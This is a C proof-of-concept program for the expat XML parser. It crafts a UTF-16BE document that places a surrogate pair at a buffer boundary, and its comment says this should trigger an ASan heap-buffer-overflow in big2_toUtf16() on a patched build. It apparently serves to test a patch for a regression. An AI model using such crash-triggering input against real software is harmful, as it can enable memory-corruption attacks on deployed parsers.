/* PoC: UTF-16 (XML_UNICODE) build. A UTF-16BE document whose character data is
 * a run of BMP characters followed by one valid surrogate pair (U+10000),
 * sized so the high surrogate lands in the last slot of the internal data
 * buffer. Drives big2_toUtf16() through the public XML_Parse() API with
 * in-contract input.
 *
 * Build (XML_UNICODE + ASan) and run; expect an ASan heap-buffer-overflow on
 * the patched tree and clean exit on the parent tree.
 */
#include <stdlib.h>
#include <string.h>

#include "expat.h"

#define LEAD_CHARS 1023

static void
put_be(unsigned char *p, unsigned short u) {
  p[0] = (unsigned char)(u >> 8);
  p[1] = (unsigned char)(u & 0xFF);
}

static volatile unsigned long g_sink;

static void
charhandler(void *userData, const XML_Char *s, int len) {
  unsigned long acc = 0;
  (void)userData;
  for (int i = 0; i < len; i++)
    acc += (unsigned long)s[i];
  g_sink += acc;
}

int
main(void) {
  /* BOM + "<r>" + LEAD_CHARS*'A' + surrogate pair + "</r>" */
  const unsigned short prologue[] = {0xFEFF, '<', 'r', '>'};
  const unsigned short epilogue[] = {'<', '/', 'r', '>'};
  const size_t nprologue = sizeof(prologue) / sizeof(prologue[0]);
  const size_t nepilogue = sizeof(epilogue) / sizeof(epilogue[0]);
  const size_t nunits = nprologue + LEAD_CHARS + 2 + nepilogue;
  const size_t nbytes = nunits * 2;

  unsigned char *doc = (unsigned char *)malloc(nbytes);
  if (! doc)
    return 2;

  size_t off = 0;
  for (size_t i = 0; i < nprologue; i++, off += 2)
    put_be(doc + off, prologue[i]);
  for (int i = 0; i < LEAD_CHARS; i++, off += 2)
    put_be(doc + off, (unsigned short)'A');
  put_be(doc + off, 0xD800);
  off += 2;
  put_be(doc + off, 0xDC00);
  off += 2;
  for (size_t i = 0; i < nepilogue; i++, off += 2)
    put_be(doc + off, epilogue[i]);

  XML_Parser parser = XML_ParserCreate(NULL);
  if (! parser) {
    free(doc);
    return 2;
  }
  XML_SetCharacterDataHandler(parser, charhandler);

  XML_Parse(parser, (const char *)doc, (int)nbytes, 1);

  XML_ParserFree(parser);
  free(doc);
  return 0;
}
